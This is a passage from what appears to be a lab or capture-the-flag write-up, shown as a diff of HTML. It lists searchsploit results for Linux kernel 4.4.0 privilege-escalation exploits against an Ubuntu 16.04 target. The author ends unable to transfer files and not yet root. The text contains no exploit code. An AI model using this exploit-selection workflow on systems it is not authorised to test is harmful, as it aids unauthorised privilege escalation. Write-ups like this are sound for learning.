+Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &#39;netfilter target_offset&#39; Local Pri | linux_x86-64/local/44300.c
+Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Esca | linux/local/43418.c
+Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) -  | linux/local/47169.c
+Linux Kernel &lt; 4.5.1 - Off-By-One (PoC)                                          | linux/dos/44301.c
+--------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+<figure>
+<img src="33.searchsploit.png" alt="" /><figcaption>33.searchsploit</figcaption>
+</figure>
+<p>The version of ubuntu is 16.04, the kernel version is 4.4.0-31.</p>
+<pre class="shell"><code>searchsploit linux kernel 4.4.0 | grep local | grep -i priv
+Linux Kernel (Solaris 10 / &lt; 5.10 138888-01) - Local Privilege Escalation        | solaris/local/15962.c
+Linux Kernel 2.6.19 &lt; 5.9 - &#39;Netfilter Local Privilege Escalation                | linux/local/50135.c
+Linux Kernel 3.11 &lt; 4.8 0 - &#39;SO_SNDBUFFORCE&#39; / &#39;SO_RCVBUFFORCE&#39; Local Privilege  | linux/local/41995.c
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &#39;AF_PACKET&#39; Race Condition Priv | linux_x86-64/local/40871.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation              | linux/local/41458.c
+Linux Kernel 4.8.0 UDEV &lt; 232 - Local Privilege Escalation                       | linux/local/41886.c
+Linux kernel &lt; 4.10.15 - Race Condition Privilege Escalation                     | linux/local/43345.c
+Linux Kernel &lt; 4.11.8 - &#39;mq_notify: double sock_put()&#39; Local Privilege Escalatio | linux/local/45553.c
+Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation    | linux/local/45010.c
+Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation           | linux/local/44298.c
+Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Esca | linux/local/43418.c
+</code></pre>
+<figure>
+<img src="34.refined-searchsploit.png" alt="" /><figcaption>34.refined-searchsploit</figcaption>
+</figure>
+<p>I cannot wget or ftp files onto the machine. Stopping here. Will do it later.</p>
+<p>Not rooted, yet!</p>
